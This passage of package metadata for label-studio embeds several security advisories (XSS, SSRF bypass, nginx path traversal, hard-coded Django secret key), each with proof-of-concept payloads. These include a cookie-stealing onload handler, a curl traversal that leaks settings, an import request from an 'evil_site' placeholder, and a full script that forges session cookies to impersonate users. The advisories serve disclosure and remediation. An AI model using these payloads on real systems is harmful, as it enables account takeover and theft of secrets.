complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.4.1.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.4.1.post0/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","google-api-core (==1.31.5)","google-auth (==1.35.0)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==1.5.0)","google-cloud-storage (~=1.29.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==0.5.1)","googleapis-common-protos (==1.52.0)","grpc-google-iam-v1 (==0.12.3)","Django (==3.1.14)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.4.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.1)","pydantic (<=1.8.2,>=1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.10.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.3.0)","label-studio-converter (==0.0.39)","label-studio-tools (==0.0.0.dev11)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.4.1.post0","yanked":true,"yanked_reason":"This version has critical bugs in project creation"},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"8b57618c02c5f228d9cbee50eeb63c33ce54683b1e1b724ad031e45ef19196da","md5":"8d490871a1b3e75be3dcd5011dd4f619","sha256":"46100b5d2499cfbddf22c9d45addf24cba1c93adfc6d0cff64f815331d23aa14"},"downloads":-1,"filename":"label_studio-1.4.1.post0-py3-none-any.whl","has_sig":false,"md5_digest":"8d490871a1b3e75be3dcd5011dd4f619","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":42764031,"upload_time":"2022-02-11T21:30:16","upload_time_iso_8601":"2022-02-11T21:30:16.659379Z","url":"https://files.pythonhosted.org/packages/8b/57/618c02c5f228d9cbee50eeb63c33ce54683b1e1b724ad031e45ef19196da/label_studio-1.4.1.post0-py3-none-any.whl","yanked":true,"yanked_reason":"This version has critical bugs in project creation"},{"comment_text":"","digests":{"blake2b_256":"d9fd14472ffc21ffa89c0bcca329c243f36e12925c080f1a3443431fd8f32d2b","md5":"0e35fd49f2c5a58a436e2e64a15cc399","sha256":"b9b3ce392c015e5ecca75b72066d5ab51c506469f17e62ec96c4c9e1d0bbab76"},"downloads":-1,"filename":"label-studio-1.4.1.post0.tar.gz","has_sig":false,"md5_digest":"0e35fd49f2c5a58a436e2e64a15cc399","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":41965516,"upload_time":"2022-02-11T21:30:28","upload_time_iso_8601":"2022-02-11T21:30:28.919508Z","url":"https://files.pythonhosted.org/packages/d9/fd/14472ffc21ffa89c0bcca329c243f36e12925c080f1a3443431fd8f32d2b/label-studio-1.4.1.post0.tar.gz","yanked":true,"yanked_reason":"This version has critical bugs in project creation"}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super 